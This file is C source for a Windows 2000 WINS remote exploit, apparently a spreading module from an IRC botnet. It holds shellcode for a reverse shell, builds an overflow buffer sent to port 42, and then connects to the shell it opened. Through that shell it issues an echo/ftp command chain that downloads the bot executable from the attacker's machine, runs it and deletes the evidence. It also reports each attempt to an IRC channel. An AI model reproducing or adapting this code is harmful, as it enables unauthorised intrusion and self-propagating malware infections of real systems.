/*************************************************************/
/* Wins 2000 remote root exploit                             */
/* Exploit by : <zuc@hack.it>                                */
/* works on Windows 2000 all SP probably every language      */
/* Win32 Support - DiablO                                    */
/*************************************************************/

#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/externs.h"
#pragma comment(lib, "ws2_32.lib")

#ifndef NO_WINS

#define sleep Sleep

char shellcode[] =
"\xeb\x25\xe9\xfa\x99\xd3\x77\xf6\x02\x06\x6c\x59\x6c\x59\xf8"
"\x1d\x9c\xde\x8c\xd1\x4c\x70\xd4\x03\x58\x46\x57\x53\x32\x5f"
"\x33\x32\x2e\x44\x4c\x4c\x01\xeb\x05\xe8\xf9\xff\xff\xff\x5d"
"\x83\xed\x2c\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c"
"\xad\x8b\x78\x08\x8d\x5f\x3c\x8b\x1b\x01\xfb\x8b\x5b\x78\x01"
"\xfb\x8b\x4b\x1c\x01\xf9\x8b\x53\x24\x01\xfa\x53\x51\x52\x8b"
"\x5b\x20\x01\xfb\x31\xc9\x41\x31\xc0\x99\x8b\x34\x8b\x01\xfe"
"\xac\x31\xc2\xd1\xe2\x84\xc0\x75\xf7\x0f\xb6\x45\x09\x8d\x44"
"\x45\x08\x66\x39\x10\x75\xe1\x66\x31\x10\x5a\x58\x5e\x56\x50"
"\x52\x2b\x4e\x10\x41\x0f\xb7\x0c\x4a\x8b\x04\x88\x01\xf8\x0f"
"\xb6\x4d\x09\x89\x44\x8d\xd8\xfe\x4d\x09\x75\xbe\xfe\x4d\x08"
"\x74\x17\xfe\x4d\x24\x8d\x5d\x1a\x53\xff\xd0\x89\xc7\x6a\x02"
"\x58\x88\x45\x09\x80\x45\x79\x0c\xeb\x82\x50\x8b\x45\x04\x35"
"\x93\x93\x93\x93\x89\x45\x04\x66\x8b\x45\x02\x66\x35\x93\x93"
"\x66\x89\x45\x02\x58\x89\xce\x31\xdb\x53\x53\x53\x53\x56\x46"
"\x56\xff\xd0\x89\xc7\x55\x58\x66\x89\x30\x6a\x10\x55\x57\xff"
"\x55\xe0\x8d\x45\x88\x50\xff\x55\xe8\x55\x55\xff\x55\xec\x8d"
"\x44\x05\x0c\x94\x53\x68\x2e\x65\x78\x65\x68\x5c\x63\x6d\x64"
"\x94\x31\xd2\x8d\x45\xcc\x94\x57\x57\x57\x53\x53\xfe\xca\x01"
"\xf2\x52\x94\x8d\x45\x78\x50\x8d\x45\x88\x50\xb1\x08\x53\x53"
"\x6a\x10\xfe\xce\x52\x53\x53\x53\x55\xff\x55\xf0\x6a\xff\xff"
"\x55\xe4";

char mess[] =
"\x00\x03\x0d\x4c\x77\x77\xFF\x77\x05\x4e\x00\x3c\x01\x02\x03\x04"
// "\x00\x03\x0d\x4c\x77\x77\xFF\x77\x05\x4e\x00\x3c\x01\x02\x03\x04"

"\x6c\xf4\x3d\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\
x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05";
char rep[] =

"\x90\x01\x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x00\
x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x03\x4e\x05\x90\x00\x4e\x05";


bool WinsConnect(EXINFO exinfo) {

		int len;
		char recvbuf[1024];
		SOCKET sockfd;
		SOCKADDR_IN shell_addr;
		memset(&shell_addr, 0, sizeof(shell_addr));
		

		shell_addr.sin_family = AF_INET;
		shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip); // = *((LPIN_ADDR) * lpHostEntry->h_addr_list);
		shell_addr.sin_port = fhtons(5432);;

		if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
			return false;
		if (fconnect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
			return false;
		
		char mkdir_buff[400];

		len = frecv(sockfd, recvbuf, 1024, 0);

		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &%s\r\n",
		GetIP(exinfo.sock),FTP_PORT, filename, filename);	

		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		
		Sleep(500);
		_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);


		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		len = frecv(sockfd, recvbuf, 1024, 0);

		fclosesocket(sockfd);
		return true;

}

BOOL Wins(EXINFO exinfo)
{
 int sock, len=16;
 int rc;
 unsigned long XORIP = 0x93939393;
 unsigned short XORPORT = 0x9393;
 int cbport;
 long cbip;
 char buffer[IRCLINE];
 
 struct sockaddr_in mytcp;

 
 WORD wVersionRequested;
 WSADATA wsaData;
 int err;
 
 wVersionRequested = MAKEWORD( 2, 2 );
 /* Confirm that the WinSock DLL supports 2.2.*/
 /* Note that if the DLL supports versions greater */
 /* than 2.2 in addition to 2.2, it will still return */
 /* 2.2 in wVersion since that is the version we */
 /* requested. */
 err = WSAStartup( wVersionRequested, &wsaData );
 if ( err != 0 ) {
  /* Tell the user that we could not find a usable */
  /* WinSock DLL. */
  return -1;
 }
 if ( LOBYTE( wsaData.wVersion ) != 2 ||
        HIBYTE( wsaData.wVersion ) != 2 ) {
  /* Tell the user that we could not find a usable */
  /* WinSock DLL. */
  WSACleanup( );
  return -1;
 }
 SOCKET sockz;
 sockz = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 cbport = htons(5432);
 cbip = inet_addr(GetIP(sockz));
 cbport ^= XORPORT;
 cbip ^= XORIP;
 memcpy(&shellcode[2],&cbport,2);
 memcpy(&shellcode[4],&cbip,4);
 
 char mess2[200000];
 memset(mess2,0,sizeof(mess2));
 char mess3[210000];
 memset(mess3,0,sizeof(mess3));
 int ir;
 for(ir =0;ir<200000;ir++)mess2[ir]='\x90';
 memcpy(mess3,mess,sizeof(mess)-1);
 int r=0;int le=sizeof(mess)-1;
 for(r;r<30;r++)
 {
  memcpy(mess3+le,rep,sizeof(rep)-1);
  le+=sizeof(rep)-1;
 }
 memcpy(mess3+le,mess2,200000);
 memcpy(mess3+le+198000,shellcode,sizeof(shellcode));
 int lenr=le+200000+sizeof(shellcode);
 
 
 sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 if (!sock)
 {
  //printf("socket() error...\n");
  exit(-1);
 }
 
 mytcp.sin_addr.s_addr = finet_addr(exinfo.ip);
 
 mytcp.sin_family = AF_INET;
 
 mytcp.sin_port=htons(42);
 
 rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct
  sockaddr_in));
 if (rc != 0)
 {

  rc = WSAGetLastError();
  return -1;
 }
 send(sock,mess3,lenr,0);
 _snprintf(buffer, sizeof(buffer), "[%s]: wh00pwh00p attempting to spl0it: %s.", exploit[exinfo.exploit].name, exinfo.ip);
 irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
 addlog(buffer);
 exploit[exinfo.exploit].stats++;
 sleep(5);
 if (WinsConnect(exinfo))
	return true;
 return false;
//	return true;
 shutdown(sock,1);
 closesocket(sock);
 return 0;
}
#endif